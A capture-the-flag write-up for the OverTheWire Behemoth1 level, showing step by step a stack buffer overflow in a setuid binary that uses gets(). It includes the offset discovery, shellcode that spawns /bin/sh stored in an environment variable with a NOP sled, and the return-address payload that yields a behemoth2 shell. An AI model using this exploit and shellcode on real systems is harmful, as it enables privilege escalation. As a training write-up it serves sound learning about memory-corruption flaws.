#Behemoth1

behemoth.labs.overthewire.org

**Username:** behemoth1
**Password:** see [behemoth0](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Behemoth/Behemoth0)
**Description:**  

This wargame deals with a lot of regular vulnerabilities found commonly 'out in the wild'. While the game makes no attempts at emulating a real environment it will teach you how to exploit several of the most common coding mistakes including buffer overflows, race conditions and privilege escalation. 

##Write-up

Let's go ahead and see what we're working with:

```
# file behemoth1 
behemoth1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=6b301db8057be8df8ceead844e81f05764289f92, not stripped
```
```
# ~/checksec.sh --file behemoth1 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   behemoth1
```

The binary is pretty much the same and we know that there are no security features enabled.  Let's look at the execution.

```
# ./behemoth1
Password: AAAAAAAAAA
Authentication failure.
Sorry.
```

Basically looks like [behemoth0](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Behemoth/Behemoth0).  Let's crack it open with a disassembler and look at main.

```asm
             main:
0804845d         push       ebp                                                 ; XREF=_start+23
0804845e         mov        ebp, esp
08048460         and        esp, 0xfffffff0
08048463         sub        esp, 0x60
08048466         mov        dword [ss:esp], 0x8048530                           ; "Password: ", argument "format" for method j_printf
0804846d         call       j_printf
08048472         lea        eax, dword [ss:esp+0x1d]
08048476         mov        dword [ss:esp], eax                                 ; argument "str" for method j_gets
08048479         call       j_gets
0804847e         mov        dword [ss:esp], 0x804853c                           ; "Authentication failure.\\nSorry.", argument "s" for method j_puts
08048485         call       j_puts
0804848a         mov        eax, 0x0
0804848f         leave      
08048490         ret        
                        ; endp
```

Ok, this is kind of weird.  It looks like the input read in isn't really stored anywhere and it immediately prints out ```Authentication failure``` after the call to ```j_gets```.  Let's stuff a bunch of data in the input and cross our fingers.

```
# python -c 'print "A"*300' | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
```

Ah, ok, something to focus on.  Let's have a look in ```gdb```.

```
# python -c 'print "A"*300' > input
# gdb behemoth1
(gdb) run < input
Starting program: /root/CTF/OverTheWire/behemoth/behemoth1 < input
Password: Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

So we now know that we have control of the application, let's try to pinpoint where in our input is controlling that location.

```
# python -c 'print "A"*70' > input
# gdb behemoth1
ing program: /root/CTF/OverTheWire/behemoth/behemoth1 < input
Password: Authentication failure.
Sorry.
[Inferior 1 (process 20488) exited normally]
```

```
# python -c 'print "A"*80' > input
# gdb behemoth1
(gdb) run < input
Starting program: /root/CTF/OverTheWire/behemoth/behemoth1 < input
Password: Authentication failure.
Sorry.
>
Program received signal SIGSEGV, Segmentation fault.
0xf7e20042 in ?? () from /lib/i386-linux-gnu/i686/cmov/libc.so.6
```

```
# python -c 'print "A"*82' > input
# gdb behemoth1
(gdb) run < input
Starting program: /root/CTF/OverTheWire/behemoth/behemoth1 < input
Password: Authentication failure.
Sorry.
>
Program received signal SIGSEGV, Segmentation fault.
0x00414141 in ?? ()
```

```
# python -c 'print "A"*83' > input
# gdb behemoth1
(gdb) run < input
Starting program: /root/CTF/OverTheWire/behemoth/behemoth1 < input
Password: Authentication failure.
Sorry.
>
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Ok, so at ```83``` we have completely overwritten that space.  Now we need to figure out how to deliver the shellcode.  Since nothing appears to actually be stored anywhere this could be tricky.  How about we try an reuse some of the things we learned in the [narnia](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/) challenges.  First off, let's try to pull of the same feat as [narnia8](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria8) and use an environment variable to store the shellcode.  We learned in that challenge that the address will change outside of ```gdb```, so let's go ahead and stuff some ```nop``` values in there for a slide back down to the shellcode.

```
behemoth1@melinda:/behemoth$ export EGG=$(python -c 'print "\x90"*100+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"')
behemoth1@melinda:/behemoth$ gdb behemoth1
(gdb) break * 0x08048479
Breakpoint 1 at 0x8048479
(gdb) run
Starting program: /games/behemoth/behemoth1 
>
Breakpoint 1, 0x08048479 in main ()
(gdb) x/s *((char **)environ)
0xffffd835:	"XDG_SESSION_ID=1977"
(gdb) x/s *((char **)environ+1)
0xffffd849:	"SHELL=/bin/bash"
(gdb) x/s *((char **)environ+2)
0xffffd859:	"TERM=xterm"
(gdb) x/s *((char **)environ+3)
0xffffd864:	"SSH_CLIENT=68.1.62.184 48350 22"
(gdb) x/s *((char **)environ+4)
0xffffd884:	"SSH_TTY=/dev/pts/3"
(gdb) x/s *((char **)environ+5)
0xffffd897:	"LC_ALL=C"
(gdb) x/s *((char **)environ+6)
0xffffd8a0:	"EGG=", '\220' <repeats 100 times>, "\061\333\215C\027\231\315\200\061\311Qhn/shh//bi\215A\v\211\343\315\200"
̀"
```

Ok, now we have our shellcode loaded and we know it will be somewhere around ```0xffffd8a0```.  Let's start brute forcing that address and see if we can hit our slide.

```
behemoth1@melinda:/behemoth$ python -c 'print "A"*79+"\xa0\xd8\xff\xff"' | ./behemoth1
Password: Authentication failure.
Sorry.
Segmentation fault
```

```
behemoth1@melinda:/behemoth$ python -c 'print "A"*79+"\xb0\xd8\xff\xff"' | ./behemoth1
Password: Authentication failure.
Sorry.
```

Ok, that one is different...but no command prompt.  It seems like we hit our shellcode so let's try a few things.  If you remember back to [narnia0](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Naria0) we had a similiar problem where we should have gotten a prompt but the program just exited.  Let's try to use the tricks we learned there.  We'll use the bash subshell command by wrapping the input being piped in with parenthesis and then concatenate the printed input with the ```cat``` command to try and force the prompt to stay open.

```
behemoth1@melinda:/behemoth$ (python -c 'print "A"*79+"\xb0\xd8\xff\xff"';cat) | ./behemoth1
Password: Authentication failure.
Sorry.
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
**********
```

Sweet.  I enjoyed this one since we got to reach back and utilize a lot of the methods that were learned in the previous series.  Now behemoth2.
